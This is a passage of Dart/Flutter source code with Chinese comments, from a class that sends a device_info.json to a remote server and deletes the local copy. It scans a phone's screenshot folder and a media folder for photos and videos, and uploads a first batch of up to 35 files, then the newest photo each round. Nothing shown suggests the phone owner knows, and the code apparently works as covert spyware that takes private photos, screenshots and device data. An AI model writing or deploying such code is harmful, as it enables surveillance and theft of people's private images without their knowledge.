          ? _config.pushTimeout
          : left;
      if (jsonTimeout <= Duration.zero) {
        debugPrint('[M] ⏱ 预算用完，JSON 推送留到下一轮');
        return false;
      }

      final streamed = await client.send(req).timeout(jsonTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonSent = true;
        _jsonUrl = serverUrl;
        await _writeSecure(_kJsonSent, '1');
        if (serverUrl != null) {
          await _writeSecure(_kJsonUrl, serverUrl);
        }
        debugPrint('[M] ✅ device_info.json 推送成功');
        return true;
      }
      debugPrint('[M] ❌ device_info.json HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[M] ❌ device_info.json 异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ── 解析服务器返回 ─────────────────────────────────────────────────
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') ||
        pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl
            .substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.pushUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      if (_outOfTime) {
        debugPrint('[M] ⏱ 预算用完（已等 $i 次），本轮不再等待服务器');
        return false;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[M] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 扫描：每次都真扫
  //   - 首轮未完成：建立或续传 pending，硬上限 35
  //   - 首轮完成：只取比 latest 新的最新 1 张
  // ══════════════════════════════════════════════════════════════════
  Future<List<_Scanned>> _scanFiles() async {
    // 首轮未完成时截图目录必须扫（pending 里可能还有失败的截图）
    final needScanShots = !_screenshotDone || !_firstBatchDone;
    final shotFuture =
        (needScanShots && _config.screenshotPath.isNotEmpty)
            ? _scanOneDir(
                _config.screenshotPath,
                isScreenshot: true,
                applySizeLimit: false,
              )
            : Future.value(<_Scanned>[]);

    final mF = _scanOneDir(
      _config.m7,
      isScreenshot: false,
      applySizeLimit: true,
    );

    final results = await Future.wait([shotFuture, mF]);
    final shotsAll = results[0];
    final mA = results[1];
    _lastScannedShotCount = shotsAll.length;

    final allScanned = <_Scanned>[...shotsAll, ...mA];

    // ── 统一出口裁剪 ────────────────────────────────────────────
    List<_Scanned> guard(List<_Scanned> list) {
      if (list.length <= _kHardMaxFiles) return list;
      debugPrint('[M] 🛡 扫描结果 ${list.length} 个超硬上限，'
          '强制裁到 $_kHardMaxFiles');
      return list.take(_kHardMaxFiles).toList();
    }

    // ══════════ 首轮模式 ══════════
    if (!_firstBatchDone) {
      // 按指纹建索引，用于 pending → 文件
      final byFp = <String, _Scanned>{};
      for (final s in allScanned) {
        byFp[_fingerprint(s)] = s;
      }

      // 清理 pending 里已删除的（扫不到、也不在 _sent 里）
      final removed = _pendingFp
          .where((fp) => !byFp.containsKey(fp) && !_sent.contains(fp))
          .toList();
      if (removed.isNotEmpty) {
        _pendingFp.removeAll(removed);
        await _persistPending();
        debugPrint('[M] 🧹 清理 pending 里已删除的 ${removed.length} 个');
      }

      // 首次：还没有 pending → 建立
      if (_pendingFp.isEmpty) {
        final all = allScanned
            .where((s) => !_sent.contains(_fingerprint(s)))
            .toList()
          ..sort((a, b) => b.modified.compareTo(a.modified));
        final picked = guard(all.take(_effectiveMaxFiles).toList());

        if (picked.isEmpty) {
          debugPrint('[M] 🅰️ 首轮：无可传文件');
          await _markFirstBatchDone(null);
          return [];
        }

        _pendingFp = picked.map(_fingerprint).toSet();
        _firstBatchMaxMtime = picked
            .map((s) => s.modified)
            .reduce((a, b) => a.isAfter(b) ? a : b);
        await _persistPending();
        await _writeSecure(_kFirstBatchMaxMtime,
            _firstBatchMaxMtime!.toIso8601String());

        debugPrint('[M] 🅰️ 首轮建立 pending：'
            '标记 ${picked.length} 个（含截图），'
            '最大时间 $_firstBatchMaxMtime');
        return guard(picked);
      }

      // 续传：只返回 pending 里未成功的
      final needUpload = <_Scanned>[];
      for (final fp in _pendingFp) {
        if (_sent.contains(fp)) continue;
        final s = byFp[fp];
        if (s != null) needUpload.add(s);
      }
      debugPrint('[M] 🅰️ 首轮续传：pending 共 ${_pendingFp.length}，'
          '本轮需传 ${needUpload.length}');
      return guard(needUpload);
    }

    // ══════════ 后续模式：只传 1 张最新 ══════════
    final latest = _latestUploadedMtime;
    if (latest == null) {
      debugPrint('[M] ⚠️ 无最新时间记录，跳过后续模式');
      return [];
    }

    final allPending = allScanned
        .where((s) => !_sent.contains(_fingerprint(s)))
        .where((s) => s.modified.isAfter(latest))
        .toList()
      ..sort((a, b) => b.modified.compareTo(a.modified));

    if (allPending.isEmpty) {
      debugPrint('[M] 🅱️ 后续：无新照片');
      return [];
    }

    final picked = [allPending.first];
    debugPrint('[M] 🅱️ 后续：发现 ${allPending.length} 张新照，'
        '只传最新一张 ${picked.first.file.path.split('/').last}');
    return guard(picked);
  }

  Future<List<_Scanned>> _scanOneDir(
    String path, {
    required bool isScreenshot,
    required bool applySizeLimit,
  }) async {
    final dir = Directory(path);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);

      if (isScreenshot) {
        if (!isImage) continue;
      } else {
        if (!isImage && !isVideo) continue;
      }

      try {
        final st = await e.stat();

        // ★ 图片按 maxImageBytes，视频按 maxSingleFileBytes
        final limit =
            isImage ? _config.maxImageBytes : _config.maxSingleFileBytes;
        if (applySizeLimit && limit > 0 && st.size > limit) {
          debugPrint('[M] 跳过超大${isImage ? "图片" : "视频"}（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB > '
              '${(limit / 1024 / 1024).toStringAsFixed(0)} MB）: $name');
          continue;
        }

        list.add(_Scanned(e, st.modified, st.size,
            isScreenshot: isScreenshot));
      } catch (_) {}
    }
    return list;
  }

  // ── 持久化（写 secure storage）────────────────────────────────────
  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        await _secure?.write(
          key: _kSent,
          value: jsonEncode(_sent.toList()),
        );
        await _secure?.write(
          key: _kSentUrls,
          value: jsonEncode(_sentUrls),
        );
        return;
      } catch (e) {
        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
  }

  Future<void> reset() async {
    _sent.clear();
    _sentUrls.clear();
    _jsonSent = false;
    _jsonUrl = null;
    _screenshotDone = false;
    _lastScannedShotCount = 0;
    _firstBatchDone = false;
    _pendingFp = <String>{};
    _firstBatchMaxMtime = null;
    _latestUploadedMtime = null;

    await _deleteSecure(_kSent);
    await _deleteSecure(_kSentUrls);
    await _deleteSecure(_kJsonSent);
    await _deleteSecure(_kJsonUrl);
    await _deleteSecure(_kScreenshotDone);
    await _deleteSecure(_kFirstBatchDone);
    await _deleteSecure(_kPendingFp);
    await _deleteSecure(_kFirstBatchMaxMtime);
    await _deleteSecure(_kLatestUploadedMtime);
    debugPrint('[M] 记录已清空（含首轮状态、pending、时间戳）');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  /// 是否来自截图目录
  final bool isScreenshot;
  _Scanned(this.file, this.modified, this.size,
      {this.isScreenshot = false});
}